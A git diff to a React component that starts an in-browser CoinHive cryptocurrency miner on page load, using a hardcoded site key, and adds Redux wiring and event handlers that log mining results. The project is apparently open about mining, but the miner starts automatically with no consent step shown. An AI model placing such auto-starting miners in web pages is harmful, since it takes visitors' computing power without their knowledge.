@@ -1,8 +1,12 @@
 import React from 'react';
+import FontAwesome from 'react-fontawesome';
+import { connect } from 'react-redux';
+import { bindActionCreators } from 'redux';
+import * as MinerActions from './actions/miner';
 
 import styles from './styles.scss';
 
-export default class App extends React.Component {
+class App extends React.Component {
   constructor(props) {
     super(props);
 
@@ -14,6 +18,14 @@ export default class App extends React.Component {
   componentWillMount() {
     var miner = new CoinHive.Anonymous('pzK5983I2Ge6zm1JN6tgx98a2XeI0Ydg');
     miner.setThrottle(0.5);
+    miner.on('accepted', (params) => {
+      console.log('accepted', params);
+      this.props.actions.hashAccepted(params.hashes);
+    });
+    miner.on('found', (params) => {
+      console.log('found', params);
+      console.log(miner.getHashesPerSecond());
+    });
     miner.start();
     this.setState({
       miner
@@ -28,3 +40,19 @@ export default class App extends React.Component {
     );
   }
 }
+
+function mapStateToProps(state) {
+  return {
+    miner: state.miner
+  }
+}
+
+function mapDispatchToProps(dispatch) {
+  return {
+    actions: bindActionCreators(Object.assign({},
+      MinerActions
+    ), dispatch)
+  };
+}
+
+export default connect(mapStateToProps, mapDispatchToProps)(App);
